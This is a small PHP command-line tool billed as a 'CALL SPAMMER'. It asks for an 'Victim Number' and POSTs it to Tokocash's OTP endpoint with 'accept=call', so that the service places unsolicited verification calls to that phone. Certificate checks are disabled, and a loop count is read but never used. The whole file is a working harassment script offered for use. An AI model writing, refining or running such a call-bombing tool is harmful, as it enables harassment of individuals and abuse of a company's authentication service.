<?php
print "\n\n \033[93m
 ------------------------------------------------
 IIIIIIIIIIIIIII                  IIIIIIIIIIIIIII
 IIIIIIIIIIIIIII                  IIIIIIIIIIIIIII
 IIIII                                      IIIII
 IIIII                                      IIIII
 IIIII ----------- CALL SPAMMER ----------- IIIII
 IIIII                                      IIIII
 IIIII          CODED BY MR.R4MZz           IIIII
 IIIII                                      IIIII
 IIIII                                      IIIII
 IIIII          THANKS TO MR.TENWAP         IIIII
 IIIII                                      IIIII
 IIIII                                      IIIII
 IIIIIIIIIIIIIII                  IIIIIIIIIIIIIII
 IIIIIIIIIIIIIII                  IIIIIIIIIIIIIII
 ------------------------------------------------
\n\n\n";
$jumlah = trim(fgets(STDIN));
	function send($phone){
        $cs = curl_init();
        curl_setopt($cs, CURLOPT_URL,"https://www.tokocash.com/oauth/otp");                      
        curl_setopt($cs, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($cs, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($cs, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($cs, CURLOPT_HEADER, true);
        curl_setopt($cs, CURLOPT_POST, 1);
        curl_setopt($cs, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        
        $result = curl_exec($cs);
        curl_close($cs);
                echo $result."\n";
}
echo "TOOLS BY ; KH4L3D\n\n";
echo "\033[92m Enter Victim Number ==> ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
?>
